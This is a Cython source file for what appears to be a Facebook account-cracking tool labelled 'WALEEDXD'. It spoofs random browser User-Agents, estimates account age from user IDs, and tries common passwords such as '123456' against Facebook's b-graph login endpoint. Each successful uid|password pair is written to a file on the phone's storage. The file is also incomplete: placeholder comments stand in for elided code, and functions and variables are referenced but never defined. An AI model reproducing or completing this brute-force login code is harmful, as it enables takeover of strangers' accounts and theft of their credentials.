# cython: language_level=3
# cython: boundscheck=False
# cython: wraparound=False
# cython: initializedcheck=False
# cython: nonecheck=False
# cython: cdivision=True

import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# Cython optimizations
from libc.stdlib cimport malloc, free
from cpython cimport array
from cython cimport parallel

# Static type declarations
cdef:
    list oks = []
    list cps = []
    list user = []
    int loop = 0
    str X = '\x1b[1;37m'
    str rad = '\x1b[38;5;196m'
    str G = '\x1b[38;5;46m'
    str Y = '\x1b[38;5;220m'
    str PP = '\x1b[38;5;203m'
    str RR = '\x1b[38;5;196m'
    str GS = '\x1b[38;5;40m'
    str W = '\x1b[1;37m'

# Optimized creationyear function
cpdef str creationyear(str uid):
    cdef int uid_len = len(uid)
    if uid_len == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        # ... [keep all your existing conditions] ...
    elif uid_len in (9, 10):
        return '2008'
    elif uid_len == 8:
        return '2007'
    elif uid_len == 7:
        return '2006'
    elif uid_len == 14 and uid.startswith('61'):
        return '2024'
    return ''

# Optimized windows() function
cpdef str windows():
    cdef:
        str aV = str(random.choice(range(10, 20)))
        str A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
        # ... [rest of your User-Agent generation] ...
    return random.choice([A, B, C, D])

# Optimized login functions
cpdef void login_1(str uid):
    global loop, oks
    cdef:
        dict data, headers
        str pw
        object res, session
    
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mWALEEDXD-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                # ... [your existing data dictionary] ...
            }
            headers = {
                # ... [your existing headers dictionary] ...
            }
            session = requests.session()
            res = session.post('https://b-graph.facebook.com/auth/login', 
                             data=data, headers=headers, 
                             allow_redirects=False).json()
            
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mWALEEDXD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                with open('/sdcard/WALEEDXD-OLD-M1-OK.txt', 'a') as f:
                    f.write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

# ... [include all your other functions with similar optimizations] ...

cpdef main():
    BNG_71_()

if __name__ == '__main__':
    main()